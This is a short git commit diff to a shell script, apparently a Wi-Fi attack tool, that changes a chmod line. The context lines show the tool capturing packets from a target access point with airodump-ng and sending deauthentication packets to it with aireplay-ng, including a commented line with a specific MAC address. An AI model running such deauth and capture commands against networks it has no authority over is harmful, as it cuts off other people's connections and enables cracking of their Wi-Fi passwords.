e70733311d90b5205b5a1aea668f6cd7c21b2c48
Liam Bendix <48177481+B3ND1X@users.noreply.github.com>
2021-04-29 08:24:18 -0400

    update

--- air-script.sh
+++ air-script.sh
@@ -240,7 +240,7 @@ sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write 
 echo -e "[${Green}wlan0mon${White}] Sending DeAuth to target..."
 sudo aireplay-ng --deauth 20 -a $bssid wlan0mon
 #sudo aireplay-ng --deauth 20 -a 30:B5:C2:9A:64:12 wlan0mon
-sudo chmod -R 755 air-script
+#sudo chmod -R 755 *
 sudo airmon-ng stop wlan0mon
 sudo ifconfig wlan0 up
 sudo systemctl start NetworkManager
